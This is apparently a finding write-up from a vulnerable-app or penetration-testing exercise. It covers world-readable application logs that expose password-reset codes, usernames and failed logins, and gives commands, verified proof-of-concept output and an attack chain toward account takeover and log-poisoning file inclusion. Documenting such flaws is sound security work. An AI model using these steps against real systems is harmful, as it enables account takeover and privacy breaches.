# 26 — World-readable application logs

- **OWASP Top 10 (2021):** A05:2021 – Security Misconfiguration
- **Severity:** Medium
- **Difficulty:** Easy

## Where

The app writes logs under two world-readable directories:

- `data/logs/`
- `web/logs/`

Relevant writers:

- `web/includes/visitlog.php:6` — visit logs under `web/logs/visits-*.log`
- `web/includes/visitlog.php:27` — failed logins written to the visit log
- `web/reset.php:29` — reset codes written to `data/logs/app.log`

```php
file_put_contents($lf, 'reset code for ' . $row['username'] . ': ' . $code . ' at ' . $now . "\n", FILE_APPEND);
```

## How it works (root cause)

Log files are created with permissive ownership/permissions and are readable
by the unprivileged `user` account and, on a multi-user host, by any local
account. The logs also contain sensitive values: usernames, failed-login
attempts, and reset codes.

## Exploitation steps

1. List log permissions:

   ```bash
   ls -l data/logs web/logs
   ```

2. Read the sensitive entries:

   ```bash
   cat data/logs/app.log
   cat web/logs/visits-*.log
   ```

## Working PoC (verified)

After triggering one reset for `ulla` (`POST /reset.php` with `who=ulla`):

```text
664 user user data/logs/app.log
reset code for ulla: 00986 at 2026-09-22 05:23:27
```

Other verified log permissions:

```text
664 user user data/logs/adminvisit.log
664 user user data/logs/adminvisit.out.log
644 root root data/logs/nginx-error.log
664 user user web/logs/visits-2026-09-22-*.log
```

## Expected result / verification

- Non-root local users can read application logs.
- `data/logs/app.log` contains a usable password-reset code.
- `web/logs/visits-*.log` contains usernames and failed-login attempts.

## Attack chain

```
local log read
  → reset code (20) → password reset takeover
  → failed-login usernames → user enumeration (30)
  → visit log poisoning / LFI chain (12)
```

## Notes

- The reset-code line makes 20 a local privilege-escalation shortcut.
- The same files are the source for the LFI log-poisoning chain in 12.
